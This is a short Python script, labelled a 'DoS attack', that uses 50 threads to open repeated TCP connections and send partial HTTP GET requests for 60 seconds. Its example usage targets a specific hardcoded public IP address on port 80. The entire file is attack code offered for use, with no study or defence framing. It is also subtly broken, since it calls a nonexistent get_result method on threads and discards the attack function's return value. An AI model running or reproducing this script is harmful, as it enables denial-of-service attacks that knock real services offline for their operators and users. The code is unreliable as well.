import socket
import time
import threading

def attack(ip, port, duration):
    start_time = time.time()
    end_time = start_time + duration
    requests_sent = 0

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b'GET / HTTP/1.1\r\n')
            s.close()
            requests_sent += 1
        except Exception as e:
            print(f"Error: {e}")

    return requests_sent

def dos_attack(ip, port, duration, threads):
    attack_threads = []
    total_requests = 0

    for _ in range(threads):
        attack_thread = threading.Thread(target=lambda: attack(ip, port, duration))
        attack_thread.start()
        attack_threads.append(attack_thread)

    for attack_thread in attack_threads:
        attack_thread.join()
        total_requests += attack_thread.get_result()

    print(f"Total requests sent: {total_requests}")

# Example usage
ip = '201.4.86.253'
port = 80
duration = 60
threads = 50
print(f"Starting enhanced DoS attack on {ip}:{port} for {duration} seconds with {threads} threads...")
dos_attack(ip, port, duration, threads)
print("Enhanced DoS attack finished.")